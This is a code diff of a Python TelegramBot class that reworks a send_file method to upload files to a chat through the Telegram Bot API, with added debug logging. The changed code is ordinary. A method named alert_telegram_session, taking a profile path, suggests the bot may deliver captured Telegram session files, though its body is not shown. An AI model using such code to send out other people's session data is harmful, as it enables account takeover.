@@ -47,25 +47,38 @@ class TelegramBot:
     
     def send_file(self, file_path: str, caption: str = "", buttons: list = None) -> bool:
         """Send file"""
+        file_path = str(file_path)
         if not self.is_configured or not Path(file_path).exists():
+            print(f"[TG] File check failed: configured={self.is_configured}, exists={Path(file_path).exists()}", flush=True)
             return False
         
         try:
+            print(f"[TG] Uploading: {file_path}", flush=True)
+            print(f"[TG] File size: {Path(file_path).stat().st_size}", flush=True)
+            
+            # Read file into memory first
             with open(file_path, 'rb') as f:
-                files = {'document': f}
-                data = {
-                    'chat_id': self.chat_id,
-                    'caption': caption,
-                    'parse_mode': 'HTML'
-                }
-                if buttons:
-                    data['reply_markup'] = json.dumps({"inline_keyboard": buttons})
-                
-                r = requests.post(f"{self.api_url}/sendDocument", files=files, data=data, timeout=30)
-                print(f"[TG] sendDocument: {r.status_code}", flush=True)
-                return r.status_code == 200
+                file_data = f.read()
+            
+            files = {'document': (Path(file_path).name, file_data)}
+            data = {
+                'chat_id': self.chat_id,
+                'caption': caption,
+                'parse_mode': 'HTML'
+            }
+            if buttons:
+                data['reply_markup'] = json.dumps({"inline_keyboard": buttons})
+            
+            print(f"[TG] Posting to API...", flush=True)
+            r = requests.post(f"{self.api_url}/sendDocument", files=files, data=data, timeout=60)
+            print(f"[TG] sendDocument: {r.status_code}", flush=True)
+            if r.status_code != 200:
+                print(f"[TG] Response: {r.text[:200]}", flush=True)
+            return r.status_code == 200
         except Exception as e:
             print(f"[TG] File error: {e}", flush=True)
+            import traceback
+            traceback.print_exc()
             return False
     
     def alert_telegram_session(self, session_id: str, profile_path: str) -> bool:
